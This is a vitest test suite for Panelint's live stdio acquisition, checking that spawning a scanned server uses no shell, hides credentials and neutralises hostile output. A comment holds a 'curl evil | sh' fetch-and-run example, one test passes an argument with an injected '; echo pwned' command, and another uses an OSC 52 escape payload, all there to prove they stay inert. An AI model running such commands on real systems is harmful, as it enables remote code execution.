/**
 * Live stdio acquisition, and the process safety around it.
 *
 * These tests exist because this is the one code path in Panelint that runs
 * somebody else's program. Every assertion below corresponds to a way that
 * goes wrong: a shell metacharacter becoming a command, a credential reaching
 * a child, a terminal escape reaching an operator, an orphaned helper holding
 * a port, or an endless stream that never terminates a scan.
 *
 * The fixtures are hand-rolled JSON-RPC (`fixtures/stub-server/stub.mjs`)
 * rather than SDK servers, because the shapes under test — a repeating cursor,
 * invalid base64, an OSC 52 stderr flood — are shapes the SDK would normalize
 * away before the scanner ever saw them.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync, spawn as nodeSpawn } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import process from 'node:process';

import { acquireStdio, UI_EXTENSION_ID, UI_MIME_TYPE } from '../src/acquire/stdio.js';
import {
  BoundedStderr,
  SafeStdioTransport,
  activePids,
  buildSpawnPlan,
  formatCommandEcho,
  groupAlive,
  redactArgv,
  stripControl,
} from '../src/safe/spawn.js';
import { DEFAULT_LIMITS } from '../src/limits.js';
import type { Limits } from '../src/types.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, '..');
const STUB = join(REPO, 'fixtures/stub-server/stub.mjs');
const RUNNER = join(REPO, 'fixtures/stub-server/scan-runner.mjs');

/** The exact document `stub.mjs` serves. */
const STUB_HTML = '<!doctype html><html><body><h1>stub</h1></body></html>';

const IS_WINDOWS = process.platform === 'win32';

function sha256(buf: Buffer): string {
  return createHash('sha256').update(buf).digest('hex');
}

/** Acquire against the stub in a given mode, with test-scale timeouts. */
async function scan(
  mode: string,
  overrides: Partial<Parameters<typeof acquireStdio>[0]> = {},
): ReturnType<typeof acquireStdio> {
  return acquireStdio({
    command: process.execPath,
    args: [STUB, mode],
    allowSpawn: true,
    requestTimeoutMs: 5_000,
    totalDeadlineMs: 15_000,
    termGraceMs: 200,
    killGraceMs: 200,
    ...overrides,
  });
}

function limitsWith(over: Partial<Limits>): Limits {
  return { ...DEFAULT_LIMITS, ...over };
}

const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

async function waitUntil(fn: () => boolean, ms: number): Promise<boolean> {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    if (fn()) return true;
    await sleep(25);
  }
  return fn();
}

// ---------------------------------------------------------------------------
// 1. The spawn plan itself
// ---------------------------------------------------------------------------

describe('buildSpawnPlan — the invariants that make execution survivable', () => {
  it('never uses a shell', () => {
    const plan = buildSpawnPlan({ command: 'node', args: ['x.js'] });
    // With shell:true a config-supplied `node x.js; curl evil | sh` becomes
    // arbitrary remote code execution rather than a failed ENOENT.
    expect(plan.options.shell).toBe(false);
  });

  it('pipes stderr rather than inheriting it', () => {
    const plan = buildSpawnPlan({ command: 'node', args: [] });
    // The SDK's own transport defaults index 2 to 'inherit', which hands a
    // hostile server a raw pipe to the operator's terminal.
    expect(plan.options.stdio).toEqual(['pipe', 'pipe', 'pipe']);
    expect(plan.options.stdio[2]).not.toBe('inherit');
  });

  it('detaches on POSIX so the process group can be signalled', () => {
    const plan = buildSpawnPlan({ command: 'node', args: [] });
    expect(plan.options.detached).toBe(!IS_WINDOWS);
  });

  it('passes a scrubbed environment, not process.env', () => {
    process.env['PANELINT_SPAWN_CANARY'] = 'leaked';
    try {
      const plan = buildSpawnPlan({ command: 'node', args: [] });
      expect(plan.options.env).not.toHaveProperty('PANELINT_SPAWN_CANARY');
      expect(Object.keys(plan.options.env).length).toBeLessThan(
        Object.keys(process.env).length,
      );
    } finally {
      delete process.env['PANELINT_SPAWN_CANARY'];
    }
  });

  it('refuses anything that is not an argv array', () => {
    // The API takes {command, args[]}. It never accepts a command string and
    // never splits one, because splitting is where quoting bugs become RCE.
    expect(() =>
      buildSpawnPlan({ command: 'node', args: [42 as unknown as string] }),
    ).toThrow(TypeError);
    expect(() =>
      buildSpawnPlan({ command: 'node', args: 'x.js' as unknown as string[] }),
    ).toThrow(TypeError);
    expect(() => buildSpawnPlan({ command: '', args: [] })).toThrow(TypeError);
  });
});

describe('a shell metacharacter is inert', () => {
  it('does not execute an appended command', async () => {
    const marker = join(REPO, 'node_modules/.cache/panelint-pwned.txt');
    rmSync(marker, { force: true });

    const set = await scan('ok', {
      // If this ever reached a shell, the file would exist.
      args: [`${STUB}; echo pwned > ${marker}`],
      requestTimeoutMs: 1_500,
      totalDeadlineMs: 4_000,
    });

    expect(existsSync(marker)).toBe(false);
    // The spawn either fails or the server never speaks; either way the scan
    // reports rather than hangs.
    expect(set.resources).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// 2. The command echo
// ---------------------------------------------------------------------------

describe('redactArgv', () => {
  it('redacts an inline credential', () => {
    expect(redactArgv(['--api-key=sk-live-abc'])).toEqual(['--api-key=<redacted>']);
    expect(redactArgv(['--auth-token=t0k'])).toEqual(['--auth-token=<redacted>']);
    expect(redactArgv(['PASSWORD=hunter2'])).toEqual(['PASSWORD=<redacted>']);
  });

  it('redacts the value token after a bare credential flag', () => {
    expect(redactArgv(['--token', 'sk-live-abc', 'other'])).toEqual([
      '--token',
      '<redacted>',
      'other',
    ]);
    expect(redactArgv(['--secret', 'shh'])).toEqual(['--secret', '<redacted>']);
  });

  it('leaves ordinary arguments alone', () => {
    expect(redactArgv(['-y', '@vendor/server', '--port', '8080'])).toEqual([
      '-y',
      '@vendor/server',
      '--port',
      '8080',
    ]);
  });

  it('is case insensitive', () => {
    expect(redactArgv(['--API-KEY=x'])).toEqual(['--API-KEY=<redacted>']);
  });
});

describe('formatCommandEcho', () => {
  it('shows the command and hides the credential', () => {
    const line = formatCommandEcho('npx', ['-y', '@vendor/server', '--api-key=sk-live-1']);
    expect(line).toContain('npx -y @vendor/server');
    expect(line).not.toContain('sk-live-1');
    expect(line).toContain('<redacted>');
  });

  it('escapes terminal control sequences in the command itself', () => {
    const line = formatCommandEcho('\x1b]52;c;cGF5bG9hZA==\x07node', []);
    expect(line).not.toContain('\x1b');
  });

  it('is echoed before the spawn and never carries the environment', async () => {
    const lines: string[] = [];
    await scan('ok', { echo: (l) => lines.push(l), args: [STUB, 'ok', '--token=abc'] });
    expect(lines.length).toBeGreaterThan(0);
    const echoed = lines.join('\n');
    expect(echoed).toContain('spawning:');
    expect(echoed).toContain('<redacted>');
    expect(echoed).not.toContain('PATH=');
    expect(echoed).not.toContain('HOME=');
  });
});

// ---------------------------------------------------------------------------
// 3. The gate
// ---------------------------------------------------------------------------

describe('allowSpawn gate', () => {
  it('refuses loudly, with a diagnostic, and spawns nothing', async () => {
    const before = activePids().length;
    const set = await acquireStdio({
      command: process.execPath,
      args: [STUB, 'ok'],
      allowSpawn: false,
    });

    // A refusal must never look like a clean scan.
    const refused = set.diagnostics.find((d) => d.code === 'SPAWN_REFUSED');
    expect(refused).toBeDefined();
    expect(refused!.detail).toMatch(/command-line only/i);
    expect(set.resources).toHaveLength(0);
    expect(set.errors).toHaveLength(0);
    expect(activePids().length).toBe(before);
  });

  it('redacts the refused command too', async () => {
    const set = await acquireStdio({
      command: 'npx',
      args: ['-y', 'srv', '--api-key=sk-live-9'],
      allowSpawn: false,
    });
    const refused = set.diagnostics.find((d) => d.code === 'SPAWN_REFUSED')!;
    expect(refused.message).not.toContain('sk-live-9');
  });
});

// ---------------------------------------------------------------------------
// 4. The happy path and the data model
// ---------------------------------------------------------------------------

describe('acquireStdio — a conformant server', () => {
  it('captures the initialize result including the extension mimeTypes', async () => {
    const set = await scan('ok');
    expect(set.source).toBe('stdio');
    expect(set.serverName).toBe('stub-server');
    expect(set.serverVersion).toBe('9.9.9');
    // Not '2026-01-26'. @modelcontextprotocol/sdk@1.30.0 caps at '2025-11-25'
    // and REFUSES the version the MCP Apps Stable spec text uses, so a live
    // scan of a conformant 2026-01-26 server cannot connect at all with this
    // SDK. See the note in fixtures/stub-server/stub.mjs.
    expect(set.protocolVersion).toBe('2025-11-25');
    expect(set.declaresUiExtension).toBe(true);
    // PANE-SPEC-007 needs the array, not merely the extension's presence.
    expect(set.declaredMimeTypes).toEqual([UI_MIME_TYPE]);
  });

  it('collects only ui:// resources', async () => {
    const set = await scan('ok');
    expect(set.resources.map((r) => r.uri)).toEqual(['ui://stub/main']);
  });

  it('retains BOTH _meta.ui sources and resolves read-wins', async () => {
    const set = await scan('ok');
    const r = set.resources[0]!;

    // PANE-SPEC-010 compares a narrow list-level CSP against a broad
    // read-level one. Discarding either makes the finding impossible.
    expect(r.metaFromList?.csp?.connectDomains).toEqual(['https://narrow.example.com']);
    expect(r.metaFromRead?.csp?.connectDomains).toEqual([
      'https://broad.example.com',
      '*',
    ]);
    expect(r.meta).toBe(r.metaFromRead);
  });

  it('recomputes the content hash from the received bytes', async () => {
    const set = await scan('ok');
    const r = set.resources[0]!;
    expect(r.content).toBe(STUB_HTML);
    expect(r.contentHash).toBe(sha256(Buffer.from(STUB_HTML, 'utf8')));
    expect(r.mimeType).toBe(UI_MIME_TYPE);
    expect(r.listedMimeType).toBe(UI_MIME_TYPE);
  });

  it('keeps the raw tool _meta so the dual-written flat key stays visible', async () => {
    const set = await scan('ok');
    const tool = set.tools[0]!;
    expect(tool.name).toBe('render_stub');
    expect(tool.meta?.resourceUri).toBe('ui://stub/main');
    // The SDK dual-writes `ui/resourceUri`. Flagging its mere presence would
    // fire on every SDK server; the rule needs both keys visible to compare.
    expect(tool.rawMeta).toHaveProperty('ui/resourceUri');
    expect(tool.rawMeta).toHaveProperty('ui');
  });

  it('leaves no tracked pid behind', async () => {
    await scan('ok');
    expect(activePids()).toEqual([]);
  });

  it('follows pagination across pages', async () => {
    const set = await scan('paged');
    // `ui://stub/main` is not in either listing page, but `render_stub`
    // references it. The spec permits that omission, so it is read anyway.
    expect(set.resources.map((r) => r.uri).sort()).toEqual([
      'ui://stub/main',
      'ui://stub/one',
      'ui://stub/two',
    ]);
  });
});

// ---------------------------------------------------------------------------
// 4b. Resources a tool references but `resources/list` omits
// ---------------------------------------------------------------------------

/**
 * apps.mdx L395 explicitly permits a server to serve a tool-referenced app
 * resource without listing it in `resources/list`. Panelint 0.1.0-0.1.3 read
 * only the listing, so every server of that shape scanned as
 * NO_RESOURCES_FOUND at exit 0 — a whole sanctioned class reported clean
 * without a single rule running, and a silent pass an attacker can choose by
 * simply not listing the resource carrying the payload.
 */
describe('tool-referenced resources absent from resources/list', () => {
  it('reads a resource only a tool references', async () => {
    const set = await scan('paged');
    const main = set.resources.find((r) => r.uri === 'ui://stub/main');
    expect(main).toBeDefined();
    expect(main!.content).not.toBe('');
  });

  it('records how each resource was discovered', async () => {
    const set = await scan('paged');
    const via = Object.fromEntries(set.resources.map((r) => [r.uri, r.discoveredVia]));
    expect(via['ui://stub/main']).toBe('tool-reference');
    expect(via['ui://stub/one']).toBe('list');
    expect(via['ui://stub/two']).toBe('list');
  });

  it('says so in a diagnostic rather than reading it silently', async () => {
    const set = await scan('paged');
    const d = set.diagnostics.find((x) => x.code === 'UNLISTED_RESOURCE');
    expect(d).toBeDefined();
    expect(d!.message).toMatch(/absent from/i);
  });

  it('does not double-read a resource that is both listed and referenced', async () => {
    // In the default mode `ui://stub/main` IS listed and IS tool-referenced.
    const set = await scan('ok');
    const mains = set.resources.filter((r) => r.uri === 'ui://stub/main');
    expect(mains).toHaveLength(1);
    expect(mains[0]!.discoveredVia).toBe('list');
    expect(set.diagnostics.some((x) => x.code === 'UNLISTED_RESOURCE')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 5. Environment isolation
// ---------------------------------------------------------------------------

describe('environment', () => {
  it('a canary variable does not reach the child', async () => {
    process.env['PANELINT_CANARY'] = 'SECRET-VALUE-DO-NOT-LEAK';
    try {
      const set = await scan('canary');
      const canary = set.resources.find((r) => r.uri === 'ui://stub/canary');
      expect(canary).toBeDefined();
      // The child reports what it actually saw in its own environment.
      expect(canary!.content).toContain('CANARY=ABSENT');
      expect(canary!.content).not.toContain('SECRET-VALUE-DO-NOT-LEAK');
    } finally {
      delete process.env['PANELINT_CANARY'];
    }
  });
});

// ---------------------------------------------------------------------------
// 6. stderr
// ---------------------------------------------------------------------------

describe('stripControl', () => {
  it('removes C0, C1 and the escape character but keeps tab', () => {
    expect(stripControl('a\x1b[31mb')).toBe('a[31mb');
    expect(stripControl('a\tb')).toBe('a\tb');
    expect(stripControl('scan\rclean')).toBe('scan clean');
    expect(stripControl('a\x07b')).toBe('ab');
    expect(stripControl('a\x9bb')).toBe('ab');
  });
});

describe('BoundedStderr', () => {
  it('caps retention and counts what it dropped', () => {
    const ring = new BoundedStderr(16);
    ring.write(Buffer.from('0123456789'));
    ring.write(Buffer.from('abcdefghij'));
    expect(ring.keptBytes).toBe(16);
    expect(ring.droppedBytes).toBe(4);
    // Head-retaining on purpose: a hostile server must not be able to evict
    // its own real startup error by flooding afterwards.
    expect(ring.text()).toBe('0123456789abcdef');
  });
});

describe('a hostile server stderr', () => {
  it('is discarded by default', async () => {
    const set = await scan('hostile-stderr');
    const surfaced = set.diagnostics.filter((d) => d.message.includes('server stderr'));
    expect(surfaced).toHaveLength(0);
  });

  it('is inert when explicitly surfaced', async () => {
    const set = await scan('hostile-stderr', { showServerStderr: true });
    const d = set.diagnostics.find((x) => x.message.includes('server stderr'));
    expect(d).toBeDefined();

    const text = d!.message;
    // OSC 52 clipboard write, OSC 8 hyperlink, ANSI SGR: all need ESC.
    expect(text).not.toContain('\x1b');
    expect(text).not.toContain('\x07');
    // A \r would let the server overwrite the line and forge a clean summary.
    expect(text).not.toContain('\r');
    expect(text).not.toContain('\n');
    // And the flood is bounded rather than filling a CI log.
    expect(text.length).toBeLessThan(6_000);
    expect(d!.detail).toMatch(/discarded/);
  });
});

// ---------------------------------------------------------------------------
// 7. Unbounded-stream defenses
// ---------------------------------------------------------------------------

describe('pagination is bounded two independent ways', () => {
  it('stops at the page cap when every cursor is fresh', async () => {
    // The hostile shape: one resource plus a NEW cursor, forever. A repeat
    // detector alone never fires on this, and maxBufferSize never sees it —
    // every frame is well formed and newline terminated.
    const set = await scan('endless-cursor', { maxPages: 4 });
    const d = set.diagnostics.find((x) => /page cap/.test(x.message));
    expect(d?.code).toBe('LIMIT_EXCEEDED');
    // The cap bounds LISTED resources. `ui://stub/main` is reached through the
    // tool list, which `paginate` bounds by the same page cap independently.
    expect(set.resources.filter((r) => r.discoveredVia === 'list')).toHaveLength(4);
    expect(set.resources.length).toBeLessThanOrEqual(5);
  });

  it('stops when a cursor repeats', async () => {
    const set = await scan('repeat-cursor', { maxPages: 50 });
    const d = set.diagnostics.find((x) => /repeated pagination cursor/.test(x.message));
    expect(d?.code).toBe('LIMIT_EXCEEDED');
  });
});

describe('timeouts', () => {
  it('a per-request timeout well under the SDK default ends the scan', async () => {
    const started = Date.now();
    const set = await scan('slow-list', { requestTimeoutMs: 400, totalDeadlineMs: 10_000 });
    const elapsed = Date.now() - started;

    // The SDK's DEFAULT_REQUEST_TIMEOUT_MSEC is 60 000. Inheriting it would
    // cost a CI minute per unanswered request.
    expect(elapsed).toBeLessThan(8_000);
    expect(set.errors.some((e) => e.code === 'ACQUIRE_FAILED')).toBe(true);
    expect(activePids()).toEqual([]);
  });

  it('a total scan deadline hard-aborts', async () => {
    const started = Date.now();
    const set = await scan('slow-list', { requestTimeoutMs: 30_000, totalDeadlineMs: 600 });
    expect(Date.now() - started).toBeLessThan(8_000);
    expect(set.errors.length + set.diagnostics.length).toBeGreaterThan(0);
    expect(activePids()).toEqual([]);
  });
});

describe('resource size', () => {
  it('refuses an oversized blob rather than decoding it', async () => {
    const set = await scan('huge', { limits: limitsWith({ maxResourceBytes: 1024 }) });
    const d = set.diagnostics.find(
      (x) => x.code === 'LIMIT_EXCEEDED' && x.resourceUri === 'ui://stub/blob',
    );
    expect(d).toBeDefined();
    expect(set.resources.map((r) => r.uri)).not.toContain('ui://stub/blob');
  });
});

// ---------------------------------------------------------------------------
// 8. Blob handling
// ---------------------------------------------------------------------------

describe('blob resources', () => {
  it('decodes strict base64 and hashes the decoded bytes', async () => {
    const set = await scan('blob');
    const r = set.resources.find((x) => x.uri === 'ui://stub/blob')!;
    expect(r.fromBlob).toBe(true);
    expect(r.content).toBe(STUB_HTML);
    // A blob and a text resource with identical decoded bytes hash identically.
    expect(r.contentHash).toBe(sha256(Buffer.from(STUB_HTML, 'utf8')));
  });

  it('refuses non-strict base64 instead of letting Buffer guess', async () => {
    const set = await scan('bad-base64');
    const d = set.diagnostics.find(
      (x) => x.code === 'PARSE_FAILED' && x.resourceUri === 'ui://stub/blob',
    );
    expect(d).toBeDefined();
    expect(d!.detail).toMatch(/content hash/i);
    expect(set.resources.map((r) => r.uri)).not.toContain('ui://stub/blob');
  });
});

// ---------------------------------------------------------------------------
// 9. Capability declaration and sanitization
// ---------------------------------------------------------------------------

describe('capability declaration', () => {
  it('diagnoses a server that never declared the ui extension', async () => {
    const set = await scan('no-extension');
    expect(set.declaresUiExtension).toBe(false);
    const d = set.diagnostics.find((x) => x.code === 'CAPABILITY_NOT_DECLARED');
    expect(d).toBeDefined();
    expect(d!.message).toContain(UI_EXTENSION_ID);
  });

  it('reports the declared mimeTypes verbatim, wrong ones included', async () => {
    const set = await scan('wrong-mime');
    expect(set.declaresUiExtension).toBe(true);
    // PANE-SPEC-007 checks that the array CONTAINS the exact MIME type. That
    // check belongs to the rule; acquisition only has to preserve the fact.
    expect(set.declaredMimeTypes).toEqual(['text/html']);
  });
});

describe('server-controlled strings', () => {
  it('are escaped before they can reach a report', async () => {
    const set = await scan('hostile-name');
    expect(set.serverName).not.toContain('\x1b');
    expect(set.serverName).not.toContain('\x07');
    expect(set.serverName).toContain('\\u001b');
    const r = set.resources[0]!;
    expect(r.mimeType).not.toContain('\x1b');
  });
});

// ---------------------------------------------------------------------------
// 10. Teardown
// ---------------------------------------------------------------------------

describe.skipIf(IS_WINDOWS)('process-group teardown', () => {
  const pidfile = join(REPO, 'node_modules/.cache/panelint-orphan-pids.json');

  afterAll(() => rmSync(pidfile, { force: true }));

  it('kills the helper the server spawned, not just the server', async () => {
    mkdirSync(dirname(pidfile), { recursive: true });
    rmSync(pidfile, { force: true });

    const transport = new SafeStdioTransport({
      command: process.execPath,
      args: [STUB, 'orphan', pidfile],
      termGraceMs: 200,
      killGraceMs: 200,
    });
    await transport.start();
    const leader = transport.pid!;
    expect(leader).toBeGreaterThan(0);
    expect(activePids()).toContain(leader);

    const wrote = await waitUntil(() => existsSync(pidfile), 5_000);
    expect(wrote).toBe(true);
    const pids = JSON.parse(readFileSync(pidfile, 'utf8')) as {
      server: number;
      helper: number;
    };

    await transport.close();

    // `node server.js` that spawns a Python helper otherwise leaves an orphan
    // holding its port. Signalling -pid is what catches it.
    const gone = await waitUntil(
      () => !groupAlive(pids.server) && !isAlive(pids.helper),
      5_000,
    );
    expect(gone).toBe(true);
    expect(activePids()).not.toContain(leader);
  });
});

function isAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

/**
 * SIGINT mid-scan, in a real process.
 *
 * Detaching the child decouples it from terminal SIGINT, so the guard handlers
 * are the ONLY thing standing between Ctrl-C and an orphaned server. That path
 * ends by re-raising the signal at the default disposition, which would take
 * the test runner with it — so the scan runs in its own process and the test
 * signals that.
 *
 * The scanner is imported from a transpile-only build, because Node cannot
 * resolve the project's `.js` import specifiers against `.ts` sources.
 */
describe.skipIf(IS_WINDOWS)('SIGINT mid-scan', () => {
  const buildDir = join(REPO, 'node_modules/.cache/panelint-stdio-build');
  const pidfile = join(REPO, 'node_modules/.cache/panelint-sigint-pids.json');
  let built = false;

  beforeAll(() => {
    rmSync(buildDir, { recursive: true, force: true });
    mkdirSync(buildDir, { recursive: true });
    execFileSync(
      'npx',
      [
        'tsc',
        '-p',
        'tsconfig.build.json',
        '--noCheck',
        '--declaration',
        'false',
        '--declarationMap',
        'false',
        '--outDir',
        buildDir,
      ],
      { cwd: REPO, stdio: 'pipe' },
    );
    writeFileSync(join(buildDir, 'package.json'), '{"type":"module"}');
    built = existsSync(join(buildDir, 'acquire/stdio.js'));
  });

  afterAll(() => {
    rmSync(pidfile, { force: true });
    rmSync(buildDir, { recursive: true, force: true });
  });

  it('leaves no surviving process group', async () => {
    expect(built).toBe(true);
    rmSync(pidfile, { force: true });

    const runner = nodeSpawn(
      process.execPath,
      [RUNNER, buildDir, STUB, 'orphan', pidfile],
      { detached: true, stdio: 'pipe' },
    );
    const runnerPid = runner.pid!;

    try {
      const wrote = await waitUntil(() => existsSync(pidfile), 15_000);
      expect(wrote).toBe(true);
      const pids = JSON.parse(readFileSync(pidfile, 'utf8')) as {
        server: number;
        helper: number;
      };
      expect(isAlive(pids.helper)).toBe(true);

      // Ctrl-C, delivered to Panelint alone. The server is in its own group
      // and receives nothing from the terminal.
      process.kill(runnerPid, 'SIGINT');

      const dead = await waitUntil(
        () => !isAlive(runnerPid) && !groupAlive(pids.server) && !isAlive(pids.helper),
        8_000,
      );
      expect(dead).toBe(true);
    } finally {
      try {
        process.kill(-runnerPid, 'SIGKILL');
      } catch {
        /* already gone */
      }
    }
  }, 40_000);
});
